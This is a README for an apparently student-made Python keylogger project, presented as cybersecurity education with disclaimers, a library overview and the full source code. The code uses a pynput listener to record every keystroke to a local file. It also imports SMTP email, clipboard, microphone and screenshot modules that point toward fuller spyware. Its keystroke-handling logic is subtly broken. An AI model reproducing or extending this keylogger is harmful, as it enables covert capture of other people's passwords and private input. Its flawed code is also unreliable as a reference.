---
title: "Python Keylogging – Cybersecurity Study"
description: "Educational Python project exploring keylogging behavior for cybersecurity learning."
---

<div align="center">

# 🛡️ Python Keylogging  
### *Educational Cybersecurity Research Project*

![Python](https://img.shields.io/badge/Python-3.x-blue)
![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Education-green)
![Status](https://img.shields.io/badge/Status-Basic%20Version-orange)
![License](https://img.shields.io/badge/License-MIT-purple)

</div>

---

## 🚨 Disclaimer

> ⚠️ **Strictly for educational purposes only**  
> ✔ Tested only on my own machine  
> ❌ No unauthorized or unethical usage  
> ⚖️ Misuse may violate privacy laws  

This project exists to **understand threats so they can be prevented**.

---

## 👋 About This Project

Hi, I’m **Jay Bidve** 👨‍💻  
This project documents my **hands-on cybersecurity learning**, focusing on **how keylogging techniques operate internally** and why such behavior is flagged by modern security tools.

> 🧠 *To defend systems effectively, one must first understand the attack — ethically.*

---

## 🎯 What This Project Demonstrates

- ⌨️ Keyboard input monitoring  
- 🖥️ System-level interaction  
- 📂 Local file logging  
- 🔐 Encryption concepts  
- 🧪 Malware behavior awareness  

> 🚧 **Current Version:** Basic (educational)

---

## ⚙️ Conceptual Working Flow

```text
Keyboard Input
      ↓
Event Listener
      ↓
Readable Conversion
      ↓
Local Logging
      ↓
Safe Termination
```
This mirrors real-world threat behavior and is important for:

Malware analysis

Digital forensics

Endpoint defense research

📚 Libraries Used (Conceptual Explanation)

Libraries are described only at a high level to maintain ethical transparency.

⌨️ Keyboard Events

pynput.keyboard
Used to understand how applications intercept keyboard events at runtime.

🖥️ System & Environment

socket, platform, getpass
Provide insight into how software gathers system and user context.

📋 Clipboard Access

win32clipboard
Demonstrates clipboard data exposure risks.

🔐 Cryptography

cryptography.fernet
Introduces symmetric encryption and secure data handling concepts.

🎙️ Audio & 📸 Screen Access

sounddevice, scipy, PIL.ImageGrab
Used to understand how input devices and screens can be accessed programmatically.

📧 Email Handling (Awareness)

email.mime, smtplib
Studied to understand structured data transmission mechanisms.

🖼️ Screenshots & Demo (Recorded on My System)

🎥 Demo Recording
<!-- Paste GIF or video link here -->

---

## 💻 Source Code (Educational Reference)

> ⚠️ **Educational Use Only**  
> The following Python code is shared **strictly for academic and learning purposes**.  
> It was developed and tested **only on my own system**.  
> Any unauthorized or unethical use is strictly prohibited.

### 📌 Why the Code Is Included
This code is provided to:
- Help learners understand how keylogging mechanisms are structured
- Demonstrate why such behavior is detected by security tools
- Support defensive cybersecurity education

---

### 🧠 Python Implementation (Basic Version)

> 🔒 **Note:**  
> This is a **basic learning implementation**, not an advanced or stealth-based system.

```python

#Libraries- Author Jay Bidve
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Now below libraries will help us to grap computer information - Author Jay Bidve

import socket
import platform

# Clipboard

import win32clipboard

from pynput.keyboard import Key , Listener

# for time we have time module

import time
import os

#for microphone
from scipy.io.wavfile import write
import sounddevice as sd

# to encrypt our file we will import crypto

from cryptography.fernet import Fernet

# to get username and more
import getpass
from requests import get

# screenshot utility , 1 at a time

from multiprocessing import Process ,freeze_support

from PIL import ImageGrab

key_information = "key_log.txt"

file_path = "D:\\Keylogger\\Python"
# we added double \\ cuz of escape sequence
extend = "\\"

# each key will be stored in key_log.txt . initalize count as 0 and we created empty list
count = 0
keys = []

def on_press(key):
    global keys , count

    print(key)

    keys.append(key)
    count += 1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

# this will write each key in file
def write_file(keys):
    with open (file_path + extend + key_information, "a") as f:
# for file manipulations - froe read we do "r" and for append we do "a"
# lets make our collected keys readable

        for key in keys:
        # So when the key will be collected it will store in manner of -- 'h' 'e' 'l' 'l' 'o'  ---  so its not not good , as we wann 'hello' , so to do so
         k = str(key).replace("'","") # 1st we will convert key to string , and we replaced each single quote with nothing , not white space or anything

        # ok now everytime user/ target hits spacebar and the white space appears in code then the next word will be written on next line , to do so -

        if k.find("space") > 0 :
            f.write("\n")
            f.close()
       
        elif k.find("Key")== -1:
            f.write(k)
            f.close()

def on_release(key):
    if key== Key.esc:
        return False # on pressing of esc btn , keylogger will stp
   
#Listener block

with Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()

```

https://github.com/user-attachments/assets/af860d94-ef49-45f0-b52b-dec8a6e863a7





🔐 Ethics & Responsibility

✔ Tested on personal device only
✔ No third-party data collected
✔ No deployment or distribution
❌ No unethical usage

Cybersecurity knowledge carries responsibility.

🚀 Future Learning Goals

Malware detection techniques

Behavioral analysis

Endpoint security research

Secure coding practices

📜 License

MIT License
Free to learn and reference.
Not permitted for malicious or unauthorized use.

<div align="center">
👤 Jay Bidve

Cybersecurity • Python • Ethical Learning

Build to learn. Learn to defend.

</div> 
